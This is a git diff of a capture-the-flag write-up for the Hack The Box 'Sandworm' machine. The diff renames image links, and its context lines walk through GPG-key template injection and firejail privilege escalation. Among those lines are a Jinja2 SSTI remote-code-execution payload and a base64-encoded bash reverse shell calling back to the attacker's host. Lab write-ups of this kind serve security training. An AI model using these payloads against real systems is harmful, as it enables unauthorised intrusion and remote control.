@@ -23,25 +23,25 @@ We have to add `ssa.htb` to our `/etc/hosts` file to visit the HTTPS site.
 
 The website promotes an agency for spies:
 
-![](<../../.gitbook/assets/image%20(2087).png>)
+![](../../.gitbook/assets/sandworm-7.png)
 
 The contact page allows us to send messages that are encrypted with a key:
 
-![](<../../.gitbook/assets/image%20(254).png>)
+![](../../.gitbook/assets/sandworm-10.png)
 
 If we check out their guide. we would find that the website allows us to view encrypt and decrypt messages using our own key:
 
-![](<../../.gitbook/assets/image%20(1196).png>)
+![](../../.gitbook/assets/sandworm-2.png)
 
 At the bottom of the page, we can also see some indication of a user:
 
-![](<../../.gitbook/assets/image%20(1132).png>)
+![](../../.gitbook/assets/sandworm-1.png)
 
 So we can import our own keys into the system, and encrypt our own messages. I don't think these messages are being used in any way or sent anywhere, so the decrypting and encrypting messages part is not that interesting.
 
 The most interesting is the function verifying keys using a public key and signed text:
 
-![](<../../.gitbook/assets/image%20(1542).png>)
+![](../../.gitbook/assets/sandworm-4.png)
 
 Since there is a user associated with the GPG key, we can try to generate one with a different UID:
 
@@ -70,11 +70,11 @@ iQGzBAEBCgAdFiEEMepfyD8ks+mbh4he1vYv2J1mwLcFAmSRCtsACgkQ1vYv2J1m
 
 Afterwards, we can take both texts and use the website to verify our signature:
 
-![](<../../.gitbook/assets/image%20(1907).png>)
+![](../../.gitbook/assets/sandworm-6.png)
 
 When we click "Verify", it would show that it worked:
 
-![](<../../.gitbook/assets/image%20(3644).png>)
+![](../../.gitbook/assets/sandworm-12.png)
 
 This website also seems to print out the username `test123` that I have supplied. This parameter might be unsanitised, and vulnerable to OS command injection or something. We can use the `--edit-key` flag to edit the UID we have specified in the key:
 
@@ -114,11 +114,11 @@ uid           [ultimate] test123
 sub   rsa3072 2023-06-20 [E]
 ```
 
-![](<../../.gitbook/assets/image%20(2939).png>)
+![](../../.gitbook/assets/sandworm-11.png)
 
 A bit more testing revealed that `{{7*'7'}}` works as well:
 
-![](<../../.gitbook/assets/image%20(1556).png>)
+![](../../.gitbook/assets/sandworm-5.png)
 
 I tested both Twig and Jinja2 payloads, and got RCE using this payload:
 
@@ -126,7 +126,7 @@ I tested both Twig and Jinja2 payloads, and got RCE using this payload:
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 
-![](<../../.gitbook/assets/image%20(1448).png>)
+![](../../.gitbook/assets/sandworm-3.png)
 
 I tried to execute this, but it didn't work:
 
@@ -140,7 +140,7 @@ What works is a `base64` encoded bash reverse shell command since the UID of the
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0NDQgMD4mMSAK | base64 -d | bash').read() }}
 ```
 
-![](<../../.gitbook/assets/image%20(596).png>)
+![](../../.gitbook/assets/sandworm-13.png)
 
 ## Privilege Escalation
 
@@ -192,7 +192,7 @@ cat admin.json
 
 With this, we can `ssh` into the next user and grab the user flag:
 
-![](<../../.gitbook/assets/image%20(223).png>)
+![](../../.gitbook/assets/sandworm-8.png)
 
 ### Tipnet + Cargo
 
@@ -285,6 +285,6 @@ You can now run 'firejail --join=10543' in another terminal to obtain a shell wh
 
 Then in another shell:
 
-![](<../../.gitbook/assets/image%20(2317).png>)
+![](../../.gitbook/assets/sandworm-9.png)
 
 Rooted!
